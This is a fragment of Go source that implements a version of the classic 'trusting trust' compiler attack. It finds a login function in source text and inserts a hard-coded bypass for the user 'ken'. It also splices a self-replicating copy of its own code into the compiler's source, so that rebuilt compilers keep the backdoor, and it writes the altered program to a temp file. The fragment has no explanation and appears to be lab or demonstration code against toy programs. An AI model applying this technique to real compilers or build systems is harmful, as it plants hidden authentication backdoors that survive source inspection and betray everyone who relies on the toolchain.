mainstub := strings.Index(string(program), "notmain()")
if mainstub != -1 {
	mainstub += len("notmain()")
	temp := program[mainstub:]
	program = program[:mainstub-len("notmain()")]
	newstub := "main()   "
	program = append(program, newstub...)
	program = append(program, temp...)
}

loginSig := "int login(char *user) {"
loginAttack := "if(strcmp(user, \"ken\") == 0) return 1;"

loginstub := strings.Index(string(program), loginSig)
if loginstub != -1 {
	fmt.Println(loginstub)
	fmt.Println("login found")
	loginstub += len(loginSig)
	var tmp []byte
	tmp = make([]byte, len(program[loginstub:]))
	_ = copy(tmp, program[loginstub:])
	program = program[:loginstub]
	fmt.Println(loginAttack)
	program = append(program, loginAttack...)
	program = append(program, tmp...)

	err := os.WriteFile("./temp-out.go", program, 0644)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
}

// compileSig := "static void compile(char *program, char *outname) {n FILE *fp = fopen(\"./temp-out.c\", \"w\");\n assert(fp);"
compileSig := "tempFile, err := os.Create(\"./temp-out.go\")\n\tif err" //!=nil{\n\tfmt.Fprintf(os.Stderr, \"Error creating temp file\")\n\tos.Exit(1)}\n\tdefer tempFile.Close()\n\t`
compileAttack := "\n\tvar prog = []byte{\n"
for i, b := range prog {
	endchar := ' '
	if (i+1)%8 == 0 {
		endchar = '\n'
	}
	compileAttack += fmt.Sprintf("\t%d,%c", b, endchar)
}
compileAttack += "}\n"
compileAttack += string(prog)
compileAttack += "\n"

compilestub := strings.Index(string(program), compileSig)
if compilestub != -1 {
	fmt.Println(compilestub)
	fmt.Println("compile found")
	compilestub += len(compileSig) + 119
	tempbuf2 := program[compilestub:]
	program = program[:compilestub]
	program = append(program, []byte(compileAttack)...)
	program = append(program, tempbuf2...)

	err = os.WriteFile("./temp-out.go", program, 0644)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
}